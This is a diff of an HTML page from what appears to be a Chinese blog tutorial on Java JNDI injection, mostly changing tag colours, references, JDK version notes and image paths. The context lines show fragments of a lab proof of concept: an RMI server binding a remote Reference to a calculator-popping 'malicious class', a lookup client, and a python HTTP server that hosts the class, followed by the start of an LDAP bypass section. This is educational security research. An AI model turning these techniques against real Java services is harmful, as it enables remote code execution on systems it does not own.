@@ -254,12 +254,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CVE/" style="color: #00a596">CVE</a>
+                <a href="/blog/tags/CVE/" style="color: #ffa2c4">CVE</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #03a9f4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #ff7d73">Java</a>
             </span>
             
         </span>
@@ -273,7 +273,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">2.6k字</span>
+        <span class="post-count">2.5k字</span>
       </span>
     </span>
 
@@ -303,7 +303,8 @@
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/</a></p>
 <p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p>
-<p>调试工具：vscode，jdk8u111</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p>
+<p>调试工具：vscode，jdk8u65，idea</p>
 <span id="more"></span>
 
 <hr>
@@ -467,7 +468,7 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
-<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>版本：（jdk8下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox%EF%BC%89">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox）</a></p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>版本：（jdk8下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox</a>）</p>
 <table>
 <thead>
 <tr>
@@ -495,9 +496,7 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
 </tbody></table>
 <h2 id="RMI注入"><a href="#RMI注入" class="headerlink" title="RMI注入"></a>RMI注入</h2><p>以一个 RMI 服务为例子，先创建一个 RMI 服务，然后再创建 JNDI 的服务端和客户端，文件结构就是之前文章中的 RMI 基础上再加上 JNDI 服务端和客户端</p>
 <p>服务端：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>
@@ -511,7 +510,7 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
         registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"RCE"</span><span class="token punctuation">,</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后准备一个弹计算器的恶意class</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
@@ -523,9 +522,7 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>接下来准备客户端</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
 
 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIRMIClient</span> <span class="token punctuation">&#123;</span>
@@ -534,19 +531,17 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
         <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后在恶意class的目录下用python起一个http服务，端口要和前面第三个位置（即表示恶意class的位置）一样</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">8081</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>接下来启动服务端，再启动客户端，即可弹计算器</p>
-<p>我这里之前调试的jdk版本太高了，jndi注入不了弹不出计算器，换了个8u111的才弹出来</p>
-<p><img src="/blog/2024/01/23/JNDI%E6%B3%A8%E5%85%A5/image-20240124134316124.png" alt="image-20240124134316124"></p>
+<p><img src="/blog/JNDI%E6%B3%A8%E5%85%A5/image-20240124134316124.png" alt="image-20240124134316124"></p>
 <h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>断点给在客户端的<code>initialContext.lookup(uri)</code>方法，启动调试并跟进</p>
 <p>首先进入了<code>InitialContext#lookup</code>:</p>
-<p><img src="/blog/2024/01/23/JNDI%E6%B3%A8%E5%85%A5/image-20240124134903022.png" alt="image-20240124134903022"></p>
+<p><img src="/blog/JNDI%E6%B3%A8%E5%85%A5/image-20240124134903022.png" alt="image-20240124134903022"></p>
 <p>调用里面的lookup，而这个lookup实际上指的是<code>GenericURLContext#lookup</code>，这次JNDI调用的是RMI服务，因此进入到了GenericURLContext，对应不同的服务contenxt也会不同</p>
-<p><del>然后调了半天调不出我要找的方法，开摆，不会是版本不一样导致的吧</del></p>
 <hr>
 <h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><p>在rmi注入被修复之后的版本，客户端执行上面的操作会报错<code>Exception in thread &quot;main&quot; javax.naming.ConfigurationException: The object  factory is untrusted. Set the system property  &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</code>，因为<code>trustURLCodebase</code>默认变为了false，因此无法实例化恶意类了</p>
 <p>这种情况可以用ldap进行绕过</p>
